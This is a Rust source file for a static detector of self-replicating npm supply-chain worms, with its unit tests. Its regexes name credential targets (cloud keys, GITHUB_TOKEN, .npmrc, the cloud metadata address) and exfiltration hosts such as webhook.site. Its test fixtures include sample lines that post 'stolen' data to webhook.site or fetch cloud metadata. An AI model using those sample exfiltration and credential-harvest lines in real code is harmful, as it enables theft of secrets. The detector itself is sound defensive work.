// Local worm-signature detector — statically detects self-propagating worm patterns
// (Shai-Hulud class). No execution, no network. Pure static analysis over .js/.yml files.

use regex::Regex;
use serde_json::{Map, Value};
use sha2::{Digest, Sha256};
use std::collections::{HashMap, HashSet};
use std::path::{Path, PathBuf};
use walkdir::WalkDir;

type Finding = Map<String, Value>;

/// Known-IOC SHA-256 hashes embedded at compile time (data/worm_iocs.txt).
static WORM_IOCS_DATA: &str = include_str!("../../data/worm_iocs.txt");

fn load_iocs() -> HashSet<String> {
    crate::runtime_lists::merge_runtime_lines(WORM_IOCS_DATA, "NPM_PRE_SCAN_IOCS")
}

fn finding(severity: &str, message: &str, file: &str, category: &str) -> Finding {
    let mut m = Map::new();
    m.insert("check".into(), Value::String("worm_signature".into()));
    m.insert("severity".into(), Value::String(severity.to_string()));
    m.insert("vector".into(), Value::String("E1".into()));
    m.insert("message".into(), Value::String(message.to_string()));
    m.insert("file".into(), Value::String(file.to_string()));
    m.insert("category".into(), Value::String(category.to_string()));
    m
}

const SCAN_EXTENSIONS: &[&str] = &["js", "cjs", "mjs", "ts", "tsx", "jsx", "yml", "yaml"];

fn scan_files(dir: &Path) -> Vec<PathBuf> {
    WalkDir::new(dir)
        .into_iter()
        .filter_map(|e| e.ok())
        .filter(|e| {
            e.path()
                .extension()
                .and_then(|ext| ext.to_str())
                .map(|ext| SCAN_EXTENSIONS.contains(&ext))
                .unwrap_or(false)
        })
        .map(|e| e.path().to_path_buf())
        .collect()
}

fn rel(dir: &Path, path: &Path) -> String {
    path.strip_prefix(dir)
        .unwrap_or(path)
        .display()
        .to_string()
        .replace('\\', "/")
}

/// Cap on the entry-surface closure walk. A normal package reaches a handful of
/// files; this only bounds a pathological one.
const REACH_MAX_FILES: usize = 256;

/// The directory the package's files are actually rooted at.
///
/// Entry points disagree, and it matters here. `run_layer1` hands over the
/// tarball EXTRACTION root, which still contains npm's `package/` wrapper
/// directory, whereas `report::run_full_registry_collect` hands over
/// `…/package` itself and `--local` hands over the package directory directly.
/// Path patterns and `main`/`bin`/`exports` resolution are only meaningful
/// relative to the real root, so find it instead of assuming.
///
/// (Found by running the tool, not by reasoning: with the extraction root the
/// paths read `package/publish-next.js`, which matched no pattern and resolved
/// no seed, so the exclusion silently did nothing. Note the wider pre-existing
/// consequence, deliberately NOT changed here — every Layer 1 finding's `file`
/// field is `package/`-prefixed on the default CLI path and unprefixed under
/// `--full`.)
fn package_root(dir: &Path) -> PathBuf {
    if dir.join("package.json").is_file() {
        return dir.to_path_buf();
    }
    let nested = dir.join("package");
    if nested.join("package.json").is_file() {
        return nested;
    }
    dir.to_path_buf()
}

/// Is this path *build/release tooling* — code that ships in the tarball but is
/// not part of what a consumer executes?
///
/// Two patterns only, each earned against a real package:
///
/// - a **leading** `scripts/` component (`node-sass`'s `scripts/util/proxy.js`,
///   `scripts/util/rejectUnauthorized.js`). Measured recall cost across arms
///   B/C/D/E: **zero**.
/// - a **root-level** file whose name starts `publish`/`release` (`fabric`'s
///   `publish-next.js`).
///
/// Deliberately NOT matched:
///
/// - **`lib/…`** — `node-sass`'s third finding is `lib/extensions.js`, which is
///   shipped runtime code required at import time. Excluding it would be
///   excluding the package's actual behaviour. **This bounds what this rule can
///   achieve, and that is the correct trade.**
/// - **nested `scripts/`** (`test/scripts/util/x.js`) — leading component only.
///   Breadth buys nothing (an attacker picks any path) and only widens the gap.
/// - **`tools/`, `build/`, `bin/`, `.github/`** — no measured instance in the
///   corpus, and `bin/` is *runtime* surface, not tooling.
fn is_build_tooling_path(path: &str) -> bool {
    if let Some(rest) = path.strip_prefix("scripts/") {
        if !rest.is_empty() {
            return true;
        }
    }
    if !path.contains('/') {
        let lower = path.to_ascii_lowercase();
        if lower.starts_with("publish") || lower.starts_with("release") {
            return true;
        }
    }
    false
}

/// Lexically normalise a package-root-relative specifier, rejecting anything
/// that escapes the package root.
///
/// Lexical on purpose — `canonicalize` would resolve symlinks and break path
/// comparison under a symlinked temp dir.
fn normalize_rel(spec: &str) -> Option<String> {
    let spec = spec.replace('\\', "/");
    let mut parts: Vec<&str> = Vec::new();
    for seg in spec.split('/') {
        match seg {
            "" | "." => {}
            ".." => {
                // Popping past the root means the specifier escapes the package.
                parts.pop()?;
            }
            other => parts.push(other),
        }
    }
    if parts.is_empty() {
        None
    } else {
        Some(parts.join("/"))
    }
}

/// Resolve a package-root-relative specifier node-style, returning the
/// root-relative path of an existing file.
fn resolve_in(dir: &Path, spec: &str) -> Option<String> {
    let norm = normalize_rel(spec)?;
    let mut candidates = vec![norm.clone()];
    for ext in ["js", "cjs", "mjs", "ts", "tsx", "jsx", "json"] {
        candidates.push(format!("{norm}.{ext}"));
    }
    for ext in ["js", "cjs", "mjs", "ts"] {
        candidates.push(format!("{norm}/index.{ext}"));
    }
    candidates.into_iter().find(|c| dir.join(c).is_file())
}

/// Collect every `./`-prefixed string in an `exports` subtree, which handles the
/// string, object and conditional-map forms uniformly.
fn collect_export_targets(v: &Value, out: &mut Vec<String>) {
    match v {
        Value::String(s) => {
            if s.starts_with("./") {
                out.push(s.clone());
            }
        }
        Value::Object(m) => {
            for vv in m.values() {
                collect_export_targets(vv, out);
            }
        }
        Value::Array(a) => {
            for vv in a {
                collect_export_targets(vv, out);
            }
        }
        _ => {}
    }
}

/// The package's **declared entry surface**: install hooks, `main`, `bin` and
/// `exports`.
///
/// Install hooks alone are NOT enough, and this is the measured heart of the
/// rule. 13 malicious packages in arm D ship exactly `package.json` plus a root
/// `publishScript.js`, declare `"main": "publishScript.js"`, and have **no
/// install hook at all** — their whole Layer 1 output is one `self_propagation`
/// finding on that file. Excluding root `publish*` on hook-reachability alone
/// would lose all 13: arm D recall 87.58% -> 84.97%, against an 86.8% floor.
///
/// `npm run <name>` indirection is followed (bounded by a visited set), because
/// without it `"postinstall": "npm run build"` + `"build": "node scripts/x.js"`
/// would make the payload *unreachable* and therefore exempt — this change would
/// otherwise open its own two-line evasion.
fn entry_seeds(pkg_json: &Value) -> Vec<String> {
    let re_file = Regex::new(r"[\w./@-]+\.(?:js|cjs|mjs|ts)").unwrap();
    let re_npm_run = Regex::new(r"npm\s+run(?:-script)?\s+([\w:.@-]+)").unwrap();

    let mut seeds: Vec<String> = Vec::new();

    if let Some(scripts) = pkg_json.get("scripts").and_then(|v| v.as_object()) {
        let mut queue: Vec<String> = crate::layer1::checks::INSTALL_HOOKS
            .iter()
            .map(|s| (*s).to_string())
            .collect();
        let mut seen: HashSet<String> = HashSet::new();
        while let Some(name) = queue.pop() {
            if !seen.insert(name.clone()) {
                continue;
            }
            let Some(cmd) = scripts.get(&name).and_then(|v| v.as_str()) else {
                continue;
            };
            for m in re_file.find_iter(cmd) {
                seeds.push(m.as_str().to_string());
            }
            for c in re_npm_run.captures_iter(cmd) {
                queue.push(c[1].to_string());
            }
        }
    }

    if let Some(main) = pkg_json.get("main").and_then(|v| v.as_str()) {
        seeds.push(main.to_string());
    }
    match pkg_json.get("bin") {
        Some(Value::String(s)) => seeds.push(s.clone()),
        Some(Value::Object(m)) => {
            for v in m.values() {
                if let Some(s) = v.as_str() {
                    seeds.push(s.to_string());
                }
            }
        }
        _ => {}
    }
    if let Some(exports) = pkg_json.get("exports") {
        collect_export_targets(exports, &mut seeds);
    }

    seeds
}

/// Transitive closure of the entry surface over *relative* `require`/`import`
/// specifiers.
///
/// Transitive rather than one hop: the walk only visits the closure of the entry
/// set, so it costs essentially the same, and one hop would leave the obvious
/// evasion open (`postinstall: node a.js` -> `a` requires `./b` -> payload in
/// `./c`). It also matters for correctness — `node-sass`'s
/// `scripts/util/rejectUnauthorized.js` is two hops from `scripts/install.js`
/// and genuinely does run at install time.
///
/// Computed specifiers (`require(dir + name)`) cannot be resolved statically, so
/// a file reached only that way stays unreachable and is exempted. That gap is
/// real and documented on [`check_worm_signature`]; `check_dynamic_require` and
/// `check_computed_load` surface the capability itself.
fn entry_reachable_files(pkg_json: &Value, dir: &Path) -> HashSet<String> {
    let re_rel = Regex::new(
        r#"(?:\brequire\s*\(|\bimport\s*\(|\bfrom\s+|\bimport\s+)\s*['"](\.{1,2}/[^'"]+)['"]"#,
    )
    .unwrap();

    let mut reachable: HashSet<String> = HashSet::new();
    let mut queue: Vec<String> = entry_seeds(pkg_json)
        .iter()
        .filter_map(|s| resolve_in(dir, s))
        .collect();

    while let Some(cur) = queue.pop() {
        if reachable.len() >= REACH_MAX_FILES {
            break;
        }
        if !reachable.insert(cur.clone()) {
            continue;
        }
        let Ok(content) = std::fs::read_to_string(dir.join(&cur)) else {
            continue;
        };
        let base = Path::new(&cur)
            .parent()
            .map(|p| p.to_string_lossy().replace('\\', "/"))
            .unwrap_or_default();
        for c in re_rel.captures_iter(&content) {
            let spec = &c[1];
            let joined = if base.is_empty() {
                spec.to_string()
            } else {
                format!("{base}/{spec}")
            };
            if let Some(r) = resolve_in(dir, &joined) {
                queue.push(r);
            }
        }
    }
    reachable
}

/// Scan `dir` for worm-class supply-chain indicators.
///
/// Three categories are checked per-file, each **SUSPECT** on its own:
///   - self_propagation: npm publish, authToken reads, registry PUT
///   - credential_harvest: TruffleHog, cloud IMDS, cloud/git credential refs
///   - exfil_persistence: webhook.site, GitHub repo creation, workflow writes, shai-hulud literal
///
/// An aggregate `worm` **BLOCK** finding is emitted when ≥2 distinct categories are present,
/// indicating a Shai-Hulud-class self-replicating worm rather than a single-vector attack.
///
/// Every scanned file is also SHA-256-hashed against the embedded IOC list
/// (data/worm_iocs.txt); an IOC match is **BLOCK** on its own, since it is a
/// match against known malware rather than a heuristic.
///
/// ## Why one category is SUSPECT and not BLOCK (v18 — measured defect, fixed)
///
/// Until v18 each category pushed its own BLOCK, independently of the ≥2 rule
/// above — so the aggregate never actually gated anything and the doc comment
/// describing it was, in effect, false. A single ordinary maintainer script was
/// enough to refuse a package.
///
/// v17 measured it on 27 legitimate popular packages: `fabric` BLOCK'd for
/// `publish-next.js`, `node-sass` for `scripts/util/rejectUnauthorized.js`,
/// `scripts/util/proxy.js` and `lib/extensions.js`. All four are release/build
/// tooling, all match only `self_propagation`, and `fabric` passes Layers 2 and 3
/// cleanly — nothing anywhere in the pipeline corroborated the accusation.
///
/// Self-propagation alone is a capability, not an attack: publishing to npm is
/// what a release script is *for*. It takes a second category — stealing
/// credentials, or exfiltrating them — to make it worm-shaped. Known-IOC hits
/// keep BLOCK because they are identity, not inference.
pub fn check_worm_signature(pkg_json: &Value, dir: &Path) -> Vec<Finding> {
    check_worm_signature_with_iocs(pkg_json, dir, &load_iocs())
}

/// Inner form with the IOC set injected.
///
/// Exists so tests can drive a known-IOC match deterministically without
/// mutating process-global env (`NPM_PRE_SCAN_IOCS`), which `cargo test`'s
/// thread-parallel harness makes unsafe — a racing set/remove would look like a
/// harness fault, and serialising it would mean a dev-dependency for one
/// assertion. Same "pure, tested core" shape as `layer2::profile`,
/// `layer2::classify` and `version_diff::diff_findings`.
pub(crate) fn check_worm_signature_with_iocs(
    pkg_json: &Value,
    dir: &Path,
    iocs: &HashSet<String>,
) -> Vec<Finding> {
    // ---- compile regexes once ----
    // Self-propagation patterns (SUSPECT alone; BLOCK only via the ≥2-category aggregate)
    let re_npm_publish = Regex::new(r"npm\s+publish\b").unwrap();
    let re_auth_token = Regex::new(r"_authToken|NPM_TOKEN|\.npmrc").unwrap();
    let re_registry_put = Regex::new(r"registry\.npmjs\.org.*PUT|PUT.*registry\.npmjs\.org").unwrap();

    // Credential harvest patterns (SUSPECT alone; BLOCK only via the ≥2-category aggregate)
    let re_trufflehog = Regex::new(r"trufflehog").unwrap();
    let re_imds = Regex::new(r"169\.254\.169\.254").unwrap();
    let re_cloud_creds = Regex::new(
        r"AWS_ACCESS_KEY_ID|AWS_SECRET_ACCESS_KEY|GITHUB_TOKEN|GH_TOKEN|\.git-credentials|\.aws/credentials",
    )
    .unwrap();

    // Exfil + persistence patterns (SUSPECT alone; BLOCK only via the ≥2-category aggregate)
    let re_webhook = Regex::new(r"webhook\.site").unwrap();
    let re_gh_repo_create = Regex::new(
        r"api\.github\.com.*/user/repos|repos\.create\b|createForAuthenticatedUser",
    )
    .unwrap();
    let re_workflow_write = Regex::new(r"\.github/workflows/").unwrap();
    let re_shai_hulud = Regex::new(r"shai.hulud").unwrap();

    let mut findings: Vec<Finding> = Vec::new();
    // Categories per FILE, not per package — the aggregate requires them to
    // co-occur in one file. See the aggregate block below.
    let mut per_file: HashMap<String, HashSet<&'static str>> = HashMap::new();
    let root = package_root(dir);
    let reachable = entry_reachable_files(pkg_json, &root);

    for path in scan_files(dir) {
        let Ok(content) = std::fs::read_to_string(&path) else {
            continue;
        };
        let file = rel(dir, &path);

        // ---- IOC hash check ----
        let hash = format!("{:x}", Sha256::digest(content.as_bytes()));
        if iocs.contains(&hash) {
            findings.push(finding(
                // BLOCK on its own: a known-IOC hash is identity, not inference.
                "BLOCK",
                &format!("Known-IOC SHA-256 match: {} ({})", hash, file),
                &file,
                "ioc_hash",
            ));
            per_file.entry(file.clone()).or_default().insert("ioc_hash");
        }

        // Build/release tooling is skipped unless it is actually reachable from
        // the package's declared entry surface.
        //
        // The IOC hash above is deliberately NOT skipped, and that ordering is
        // the most important structural detail in this function: a hash is
        // identity, not inference, and must not become evadable by choosing a
        // directory name.
        // Decided on the path relative to the real package root; `file` stays
        // relative to `dir` so finding messages keep their existing shape.
        let from_root = rel(&root, &path);
        if is_build_tooling_path(&from_root) && !reachable.contains(&from_root) {
            continue;
        }

        // ---- self_propagation ----
        if re_npm_publish.is_match(&content)
            || re_auth_token.is_match(&content)
            || re_registry_put.is_match(&content)
        {
            findings.push(finding(
                "SUSPECT",
                &format!(
                    "Self-propagation indicator in {} (npm publish / authToken / registry PUT)",
                    file
                ),
                &file,
                "self_propagation",
            ));
            per_file.entry(file.clone()).or_default().insert("self_propagation");
        }

        // ---- credential_harvest ----
        if re_trufflehog.is_match(&content)
            || re_imds.is_match(&content)
            || re_cloud_creds.is_match(&content)
        {
            findings.push(finding(
                "SUSPECT",
                &format!(
                    "Credential-harvest indicator in {} (TruffleHog / IMDS / cloud credentials)",
                    file
                ),
                &file,
                "credential_harvest",
            ));
            per_file.entry(file.clone()).or_default().insert("credential_harvest");
        }

        // ---- exfil_persistence ----
        if re_webhook.is_match(&content)
            || re_gh_repo_create.is_match(&content)
            || re_workflow_write.is_match(&content)
            || re_shai_hulud.is_match(&content)
        {
            findings.push(finding(
                "SUSPECT",
                &format!(
                    "Exfil/persistence indicator in {} (webhook.site / GitHub repo create / workflow write / shai-hulud)",
                    file
                ),
                &file,
                "exfil_persistence",
            ));
            per_file.entry(file.clone()).or_default().insert("exfil_persistence");
        }
    }

    // ---- aggregate worm finding ----
    // Require ≥2 distinct functional categories CO-LOCATED IN ONE FILE
    // (ioc_hash alone is not sufficient for the worm badge).
    //
    // v20: the count used to accumulate package-wide, so two unrelated build
    // scripts each tripping a different category BLOCK'd the whole package — a
    // `semantic-release`-shaped repo with `npm publish` in one script and
    // `GITHUB_TOKEN` in another is a BLOCK on wholly legitimate code. It had not
    // fired on the 27-package benign corpus, but nothing prevented it, and
    // BLOCK-level FPR 0.0% is this project's headline v18/v19 claim.
    //
    // Requiring co-location costs nothing measured: all 77 `worm` aggregates
    // across arms C, D and E already have ≥2 categories in a single file, and
    // exactly zero rely on cross-file accumulation.
    let functional = |cats: &HashSet<&'static str>| cats.iter().filter(|&&c| c != "ioc_hash").count();
    let max_colocated = per_file.values().map(functional).max().unwrap_or(0);
    if max_colocated >= 2 {
        let mut worm_f = Map::new();
        worm_f.insert("check".into(), Value::String("worm_signature".into()));
        worm_f.insert("severity".into(), Value::String("BLOCK".into()));
        worm_f.insert("vector".into(), Value::String("E1".into()));
        worm_f.insert(
            "message".into(),
            Value::String(format!(
                "Self-replicating worm pattern detected (Shai-Hulud class): {} categories triggered in one file",
                max_colocated
            )),
        );
        worm_f.insert("category".into(), Value::String("worm".into()));
        findings.push(worm_f);
    }

    findings
}

#[cfg(test)]
mod tests {
    use super::*;
    use serde_json::json;
    use std::fs;
    use tempfile::TempDir;

    fn dir_with(files: &[(&str, &str)]) -> TempDir {
        let tmp = TempDir::new().unwrap();
        for (name, content) in files {
            // create parent dirs if needed (e.g. ".github/workflows/foo.yml")
            let full = tmp.path().join(name);
            if let Some(parent) = full.parent() {
                fs::create_dir_all(parent).unwrap();
            }
            fs::write(full, content).unwrap();
        }
        tmp
    }

    /// No `package.json`, so nothing is on the entry surface. The conservative
    /// direction: build-tooling paths are exempt, everything else is scanned.
    fn wormsig(dir: &Path) -> Vec<Finding> {
        check_worm_signature(&Value::Null, dir)
    }

    /// With a manifest, so entry-surface reachability is in play.
    fn wormsig_pkg(pkg_json: Value, dir: &Path) -> Vec<Finding> {
        check_worm_signature(&pkg_json, dir)
    }

    fn cats(findings: &[Finding]) -> Vec<&str> {
        findings
            .iter()
            .filter_map(|f| f.get("category").and_then(|v| v.as_str()))
            .collect()
    }

    // 3e: the embedded worm_iocs.txt header comment (`# …`) must not leak into
    // the loaded IOC hash set, and the two known real entries must survive.
    #[test]
    fn load_iocs_skips_header_comments() {
        let iocs = load_iocs();
        assert!(
            !iocs.iter().any(|h| h.starts_with('#')),
            "no loaded IOC hash should start with '#'"
        );
        assert!(iocs.contains("46faab8ab153fae6e80e7cca38eab363075bb524edd79e42269217a083628f09"));
        assert!(iocs.contains("a93763f6ab091f65976482aabd82af5d152210039986e508f0df5811309eaa10"));
        assert!(iocs.len() >= 2, "expected at least the 2 known IOC hashes, got {}", iocs.len());
    }

    #[test]
    fn self_propagation_npm_publish() {
        let d = dir_with(&[("bundle.js", "exec('npm publish --access public');")]);
        let f = wormsig(d.path());
        assert!(cats(&f).contains(&"self_propagation"), "got: {:?}", f);
        assert!(f.iter().all(|f| f.get("vector").and_then(|v| v.as_str()) == Some("E1")));
    }

    #[test]
    fn credential_harvest_imds() {
        let d = dir_with(&[("a.js", "fetch('http://169.254.169.254/latest/meta-data/');")]);
        let f = wormsig(d.path());
        assert!(cats(&f).contains(&"credential_harvest"), "got: {:?}", f);
    }

    #[test]
    fn exfil_persistence_webhook() {
        let d = dir_with(&[("a.js", "fetch('https://webhook.site/abc123', {body: data});")]);
        let f = wormsig(d.path());
        assert!(cats(&f).contains(&"exfil_persistence"), "got: {:?}", f);
    }

    #[test]
    fn aggregate_worm_emitted_when_two_functional_categories() {
        let d = dir_with(&[(
            "bundle.js",
            "exec('npm publish'); fetch('https://webhook.site/x', {body: stolen});",
        )]);
        let f = wormsig(d.path());
        assert!(cats(&f).contains(&"worm"), "expected worm aggregate; got: {:?}", f);
        let worm_finding = f.iter().find(|f| f.get("category").and_then(|v| v.as_str()) == Some("worm"));
        assert_eq!(
            worm_finding.and_then(|f| f.get("vector")).and_then(|v| v.as_str()),
            Some("E1")
        );
    }

    #[test]
    fn single_category_no_worm_aggregate() {
        let d = dir_with(&[("a.js", "exec('npm publish --access public');")]);
        let f = wormsig(d.path());
        assert!(!cats(&f).contains(&"worm"), "should not emit worm with single category; got: {:?}", f);
    }

    #[test]
    fn clean_file_no_findings() {
        let d = dir_with(&[("index.js", "module.exports = function add(a,b){return a+b;};")]);
        let f = wormsig(d.path());
        assert!(f.is_empty(), "clean file should produce no findings; got: {:?}", f);
    }

    // ── v18 severity pinning ───────────────────────────────────────────────────
    // These lock in the fix for the measured FP: a lone category must not BLOCK.

    fn severities(f: &[Finding]) -> Vec<&str> {
        f.iter()
            .filter_map(|x| x.get("severity").and_then(|v| v.as_str()))
            .collect()
    }

    /// One category, on a path that is NOT build tooling, stays SUSPECT.
    /// (The `publish-next.js` half of this case moved to the exclusion tests
    /// below, where that file is now exempt entirely.)
    #[test]
    fn single_category_is_suspect_not_block() {
        let d = dir_with(&[("index.js", "exec('npm publish --access public');")]);
        let f = wormsig(d.path());
        assert_eq!(
            severities(&f),
            vec!["SUSPECT"],
            "one category is a capability, not a worm; got: {f:?}"
        );
    }

    /// Repeated hits of the SAME category across several files stay SUSPECT —
    /// `node-sass`'s exact shape. Breadth within one category is not the same as
    /// two categories.
    ///
    /// Uses the real reachability shape: `"install": "node scripts/install.js"`
    /// pulls both `scripts/util/*` files onto the entry surface, so they are
    /// scanned rather than exempt — they genuinely do run at install time.
    #[test]
    fn repeated_single_category_across_files_stays_suspect() {
        let d = dir_with(&[
            (
                "scripts/install.js",
                "require('./util/proxy'); require('./util/rejectUnauthorized');",
            ),
            ("scripts/util/rejectUnauthorized.js", "// reads .npmrc"),
            ("scripts/util/proxy.js", "// reads .npmrc"),
            ("lib/extensions.js", "// reads .npmrc"),
        ]);
        let f = wormsig_pkg(
            json!({ "scripts": { "install": "node scripts/install.js" } }),
            d.path(),
        );
        assert_eq!(f.len(), 3, "expected one finding per reachable file; got: {f:?}");
        assert!(
            severities(&f).iter().all(|s| *s == "SUSPECT"),
            "got: {f:?}"
        );
        assert!(!cats(&f).contains(&"worm"), "got: {f:?}");
    }

    /// EACH functional category, alone, must be SUSPECT — asserted per category
    /// rather than once, because a bulk edit demoting "the categories" can easily
    /// miss one or catch the IOC branch by mistake. (It did, during v18.)
    #[test]
    fn every_functional_category_alone_is_suspect() {
        for (name, body) in [
            ("self_propagation", "exec('npm publish --access public');"),
            ("credential_harvest", "const u = 'http://169.254.169.254/latest';"),
            ("exfil_persistence", "fetch('https://webhook.site/abc');"),
        ] {
            let d = dir_with(&[("a.js", body)]);
            let f = wormsig(d.path());
            assert_eq!(
                severities(&f),
                vec!["SUSPECT"],
                "{name} alone must be SUSPECT, not BLOCK; got: {f:?}"
            );
            assert!(!cats(&f).contains(&"worm"), "{name}: got {f:?}");
        }
    }

    /// Two categories together are worm-shaped: the aggregate BLOCKs. Checked for
    /// every pair, so the BLOCK cannot come from one privileged category.
    #[test]
    fn two_categories_still_block_via_aggregate() {
        let bodies = [
            ("self_propagation", "exec('npm publish --access public');"),
            ("credential_harvest", "const u = 'http://169.254.169.254/latest';"),
            ("exfil_persistence", "fetch('https://webhook.site/abc');"),
        ];
        for (i, (na, a)) in bodies.iter().enumerate() {
            for (nb, b) in bodies.iter().skip(i + 1) {
                let d = dir_with(&[("bundle.js", &format!("{a}\n{b}"))]);
                let f = wormsig(d.path());
                assert!(
                    severities(&f).contains(&"BLOCK"),
                    "{na} + {nb} must BLOCK via the aggregate; got: {f:?}"
                );
                assert!(cats(&f).contains(&"worm"), "{na} + {nb}: got {f:?}");
            }
        }
    }

    /// A known-IOC hash is identity, not inference — it BLOCKs on its own.
    #[test]
    fn ioc_hash_alone_still_blocks() {
        // Content whose SHA-256 is in data/worm_iocs.txt would be needed for a
        // true end-to-end check; tests/layer1_worm.rs::e1_shai_hulud_static_blocks
        // covers that against the real fixture. Here we assert the severity the
        // IOC branch is written with, so a future demotion sweep cannot catch it.
        let src = include_str!("worm_signature.rs");
        let ioc_branch = src
            .split(r#""ioc_hash","#)
            .next()
            .expect("ioc_hash push not found");
        let tail = &ioc_branch[ioc_branch.len().saturating_sub(400)..];
        assert!(
            tail.contains(r#""BLOCK""#),
            "the ioc_hash finding must stay BLOCK; tail was:\n{tail}"
        );
    }
    // ---- v20: build/release tooling path exclusion ----

    /// A `scripts/` file that nothing on the entry surface reaches is exempt.
    /// `node-sass`'s `scripts/util/proxy.js` shape with no manifest.
    #[test]
    fn build_tooling_path_excluded_when_not_reachable() {
        let d = dir_with(&[("scripts/util/proxy.js", "// reads .npmrc")]);
        assert!(
            wormsig(d.path()).is_empty(),
            "unreachable release tooling must not be accused"
        );
    }

    /// The reachability condition is load-bearing, not decorative: a tooling
    /// path NAMED by an install hook is scanned.
    #[test]
    fn build_tooling_path_scanned_when_reached_from_an_install_hook() {
        let d = dir_with(&[("scripts/install.js", "exec('npm publish');")]);
        let f = wormsig_pkg(
            json!({ "scripts": { "install": "node scripts/install.js" } }),
            d.path(),
        );
        assert_eq!(cats(&f), vec!["self_propagation"], "got: {f:?}");
    }

    /// Pins the TRANSITIVE walk. A regression to one hop would let a payload
    /// hide two requires deep from the hook entry point.
    #[test]
    fn hook_reachability_follows_a_deeper_require_chain() {
        let d = dir_with(&[
            ("scripts/a.js", "require('./b');"),
            ("scripts/b.js", "require('./c');"),
            ("scripts/c.js", "exec('npm publish');"),
        ]);
        let f = wormsig_pkg(
            json!({ "scripts": { "postinstall": "node scripts/a.js" } }),
            d.path(),
        );
        assert_eq!(cats(&f), vec!["self_propagation"], "got: {f:?}");
        assert_eq!(
            f[0].get("file").and_then(|v| v.as_str()),
            Some("scripts/c.js")
        );
    }

    /// Pins the `npm run` indirection hop. Without it, this exact two-line
    /// manifest would make the payload unreachable and therefore EXEMPT — the
    /// change would open its own evasion.
    #[test]
    fn hook_reachability_resolves_npm_run_indirection() {
        let d = dir_with(&[("scripts/build.js", "exec('npm publish');")]);
        let f = wormsig_pkg(
            json!({ "scripts": { "postinstall": "npm run build", "build": "node scripts/build.js" } }),
            d.path(),
        );
        assert_eq!(cats(&f), vec!["self_propagation"], "got: {f:?}");
    }

    /// ⚠ THE 13-PACKAGE REGRESSION GUARD — the most important test in this file.
    ///
    /// 13 malicious packages in arm D ship exactly `package.json` plus a root
    /// `publishScript.js`, declare it as `main`, and have **no install hook at
    /// all**. Their entire Layer 1 output is one `self_propagation` finding on
    /// that file. Narrowing reachability to install hooks only — the obvious
    /// simplification — loses all 13 and takes arm D recall 87.58% -> 84.97%,
    /// against an 86.8% floor.
    ///
    /// If someone "simplifies" `entry_seeds` to hooks only, this fails here
    /// instead of silently in an arm run six hours later.
    #[test]
    fn root_publish_script_that_is_main_is_still_scanned() {
        let d = dir_with(&[(
            "publishScript.js",
            "require('child_process').exec('npm publish');",
        )]);
        let f = wormsig_pkg(
            json!({ "main": "publishScript.js", "scripts": { "test": "echo ok" } }),
            d.path(),
        );
        assert_eq!(
            cats(&f),
            vec!["self_propagation"],
            "a payload that IS the package entry point is not build tooling; got: {f:?}"
        );
    }

    /// `fabric`'s shape: root `publish-next.js`, entry surface entirely under
    /// `dist/`, and a `prepare` hook that names no file. Verified against the
    /// live registry document — fabric has no `main`, no `bin`, and every
    /// `exports` target is `./dist/*` or `./dist-extensions/*`.
    #[test]
    fn root_publish_script_that_is_release_tooling_is_excluded() {
        let d = dir_with(&[
            ("publish-next.js", "exec('npm publish --access public');"),
            ("dist/index.js", "module.exports = {};"),
        ]);
        let f = wormsig_pkg(
            json!({
                "exports": { ".": { "require": "./dist/index.js" } },
                "scripts": { "prepare": "husky" }
            }),
            d.path(),
        );
        assert!(f.is_empty(), "fabric's release script must be exempt; got: {f:?}");
    }

    /// The deliberate LIMIT of the path patterns. `lib/` is shipped runtime code
    /// (`node-sass`'s `lib/extensions.js`), so it is never build tooling — do
    /// not "improve" the pattern into it.
    #[test]
    fn lib_path_is_not_build_tooling() {
        let d = dir_with(&[("lib/extensions.js", "// reads .npmrc")]);
        assert_eq!(
            cats(&wormsig(d.path())),
            vec!["self_propagation"],
            "lib/ is runtime code, not tooling"
        );
    }

    /// `bin` and `exports` are entry surface too, so they rescue a tooling path.
    #[test]
    fn bin_and_exports_entry_points_rescue_a_tooling_path() {
        let d = dir_with(&[("scripts/cli.js", "exec('npm publish');")]);
        let via_bin = wormsig_pkg(json!({ "bin": { "x": "scripts/cli.js" } }), d.path());
        assert_eq!(cats(&via_bin), vec!["self_propagation"], "bin: {via_bin:?}");

        let via_exports =
            wormsig_pkg(json!({ "exports": "./scripts/cli.js" }), d.path());
        assert_eq!(
            cats(&via_exports),
            vec!["self_propagation"],
            "exports: {via_exports:?}"
        );
    }

    /// A specifier that climbs out of the package root resolves to nothing and
    /// must not panic or reach outside the tarball.
    #[test]
    fn hook_reachability_does_not_escape_the_package_root() {
        let d = dir_with(&[("scripts/a.js", "require('../../../etc/passwd');")]);
        let f = wormsig_pkg(
            json!({ "scripts": { "postinstall": "node scripts/a.js" } }),
            d.path(),
        );
        assert!(f.is_empty(), "got: {f:?}");
    }

    // ---- v20: the aggregate requires co-location in one file ----

    /// ⚠ THE LATENT BLOCK-LEVEL FALSE POSITIVE this fix closes.
    ///
    /// A `semantic-release`-shaped package: `npm publish` in one release script
    /// (self_propagation) and `GITHUB_TOKEN` in another (credential_harvest),
    /// with no install hook. Under the pre-v20 package-wide accumulation this
    /// was a **BLOCK on wholly legitimate code**. It never fired on the
    /// 27-package benign corpus, but nothing prevented it — and BLOCK-level FPR
    /// 0.0% is this project's headline v18/v19 claim.
    #[test]
    fn two_build_scripts_hitting_two_categories_do_not_block() {
        let d = dir_with(&[
            ("scripts/release.js", "exec('npm publish');"),
            ("scripts/gh-release.js", "const t = process.env.GITHUB_TOKEN;"),
            ("index.js", "module.exports = {};"),
        ]);
        let f = wormsig_pkg(json!({ "main": "index.js" }), d.path());
        assert!(
            !cats(&f).contains(&"worm"),
            "two ordinary release scripts must not form a worm aggregate; got: {f:?}"
        );
        assert!(
            !severities(&f).contains(&"BLOCK"),
            "and must not BLOCK; got: {f:?}"
        );
    }

    /// The general form: two categories in two DIFFERENT files are not a worm.
    /// Measured cost of requiring co-location: zero — all 77 real `worm`
    /// aggregates across arms C, D and E already have >=2 categories in a
    /// single file, and none relies on cross-file accumulation.
    #[test]
    fn two_categories_in_different_files_do_not_form_the_aggregate() {
        let d = dir_with(&[
            ("a.js", "exec('npm publish');"),
            ("b.js", "fetch('https://webhook.site/abc');"),
        ]);
        let f = wormsig(d.path());
        assert_eq!(f.len(), 2, "both files are still individually SUSPECT: {f:?}");
        assert!(severities(&f).iter().all(|s| *s == "SUSPECT"), "got: {f:?}");
        assert!(!cats(&f).contains(&"worm"), "got: {f:?}");
    }
}
